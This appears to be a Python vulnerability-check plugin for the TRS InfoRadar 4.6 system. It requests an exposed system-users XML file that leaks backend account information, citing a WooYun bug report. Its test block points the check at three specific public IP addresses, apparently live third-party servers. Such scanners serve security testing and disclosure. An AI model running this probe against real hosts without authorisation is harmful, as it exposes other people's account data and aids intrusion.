#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:TRS网络信息雷达4.6系统敏感信息泄漏到进后台
#Refer:http://www.wooyun.org/bugs/wooyun-2010-091999

def assign(service,arg):
    if service=="trs_inforadar":
        return True,arg 
    
def  audit(arg):
    
    url=arg+"inforadar/jsp/xml/init_sysUsers.xml"
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "java.beans.XMLDecoder" in res and 'property' in res:
        security_hole(url)
    
if __name__=="__main__":
    from dummy import *
    
    audit(assign('trs_inforadar','http://114.255.93.220/')[1])
    audit(assign('trs_inforadar','http://219.130.221.60:8080/')[1])
    audit(assign('trs_inforadar','http://210.41.208.98:8080/')[1])